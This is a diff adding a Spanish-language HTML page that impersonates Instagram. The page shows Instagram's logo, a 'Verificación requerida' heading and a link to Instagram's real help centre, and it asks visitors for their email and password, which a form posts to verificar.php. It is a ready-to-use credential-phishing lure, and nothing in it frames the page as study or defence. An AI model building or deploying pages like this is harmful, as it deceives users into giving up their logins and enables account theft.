@@ -1,0 +1,97 @@
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" href="C:\Users\taharin\Desktop\HTML project\imagenes/lam-fZmwmvn.png" size="35x35"
+        typee="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Verificación de Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            text-align: center;
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #333;
+        }
+
+        p {
+            font-size: 16px;
+            color: #666;
+        }
+
+        a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+        }
+
+        input[type="submit"] {
+            background-color: #3897f0;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #3076d1;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png"
+            alt="Instagram Logo" class="logo" width="100">
+        <h1>Verificación requerida</h1>
+        <p>Por favor, verifica tu <strong>correo electrónico</strong> o tus <strong>credenciales de inicio de
+                sesión</strong>.</p>
+        <form action="verificar.php" method="post">
+            <input type="text" name="email" placeholder="Correo electrónico" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <input type="submit" value="Verificar">
+        </form>
+        <p>Si necesitas ayuda, visita nuestro <a href="https://help.instagram.com/" target="_blank">Centro de ayuda</a>.
+        </p>
+    </div>
+</body>
+
+</html>
